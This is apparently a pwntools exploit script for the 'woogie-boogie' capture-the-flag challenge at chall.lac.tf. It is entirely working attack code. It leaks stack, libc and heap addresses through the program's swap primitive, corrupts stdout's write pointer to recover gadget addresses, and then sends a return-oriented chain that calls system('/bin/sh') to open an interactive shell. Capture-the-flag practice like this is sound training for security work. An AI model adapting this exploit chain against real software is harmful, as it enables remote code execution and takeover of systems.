#!/usr/bin/env python3

from pwn import *

exe = ELF("./woogie-boogie")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

serv = "chall.lac.tf"
port = 31166

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process(["./run"])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                b *$pie+0x13b0
            """)
    return r

r = conn()

rel = 0
INC = 0xe0

def swap(a1, a2):
    r.sendlineafter(b"woogie:", str(a1).encode())
    r.sendlineafter(b"boogie:", str(a2).encode())

def skip():
    global rel
    swap(0, 0)
    rel -= INC

def read(off):
    swap(5, 12)
    swap(0, off)
    if rel > 0:
        skip()
    else:
        swap(0, 0)
    l = r.recvline().strip()
    return u64(l, endian="big")

def math(addr):
    addr = ((addr & 0xff00) >> 8) | ((addr & 0xff) << 8)
    return -(2**16 - addr)

lastm = 0
misal = 0

def getmisal(stack, heap):
    global lastm, misal
    misal = 0
    envp = stack+0x3c8
    # search envp for two byte misalignment
    for i in range(lastm, lastm+0x20):
        log.info(str(i)) 
        a = read((envp+i*8-rel)//8)
        if a & 0xf == 0xa or a & 0xf == 2:
            misal = a
            break
    if misal == 0:
        print("no suitable misalignment in envp")
        exit()
    if i > lastm:
        lastm = i+1
    log.info(f"{hex(misal)=}") 
    # recover misalignment by double reversing
    swap(5, 12)
    swap((heap-rel)//8, 0)
    skip()
    swap(5, 12)
    swap((heap-rel)//8, (envp-rel)//8)
    skip()

def main():
    global rel, misal
    # get sufficient leaks
    stack = read(7)-0x3b8
    log.info(f"{hex(stack)=}")
    libc.address = read(12)-0x24083
    log.info(f"{hex(libc.address)=}")
    exe.address = read(9)-exe.sym.main
    log.info(f"{hex(exe.address)=}")
    rel = stack
    heap = read((libc.address+0x1ec2c8-rel)//8)+0x2a0
    log.info(f"{hex(heap)=}")

    envp = stack+0x3c8
    getmisal(stack, heap)
    # partially overwrite libc address by misaligning stdout,
    # we can control low two bytes with large negative offset
    stdout_writeptr = libc.sym._IO_2_1_stdout_+5*8
    swap(2, math(libc.sym.gets))
    swap(0, math(libc.sym.gets))
    swap((misal-2-rel+8)//8, (stack+0x268-rel)//8)
    swap((envp-rel)//8, (stdout_writeptr-rel)//8)
    swap(5, 12)
    skip()
    gets = misal-2+8
    log.info(f"{hex(gets)=}")

    getmisal(stack, heap)
    swap(2, math(libc.address+0x23b6a))
    swap(0, math(libc.address+0x23b6a))
    swap((misal-2-rel+8)//8, (libc.address+0x1ec058-rel)//8)
    swap((envp-rel)//8, (stdout_writeptr-rel)//8)
    swap(5, 12)
    skip()
    poprdi = misal-2+8
    log.info(f"{hex(poprdi)=}")

    swap(5, (poprdi-rel)//8)
    swap(6, (libc.address+0x1f2038-rel)//8)
    swap(7, (gets-rel)//8)
    swap(8, 12)
    skip()
    bss = libc.address+0x1f2488
    log.info(f"sending rop")
    r.sendline(p64(libc.address+0x23b6a) + p64(next(libc.search(b"/bin/sh\x00"))) + p64(libc.address+0x22679) + p64(libc.sym.system))
    swap(5, (bss-rel-0x20)//8)
    swap(6, (bss+8-rel-0x20)//8)
    swap(7, (bss+0x10-rel-0x20)//8)
    swap(8, (bss+0x18-rel-0x20)//8)
    skip()
    r.interactive()

if __name__ == "__main__":
    main()
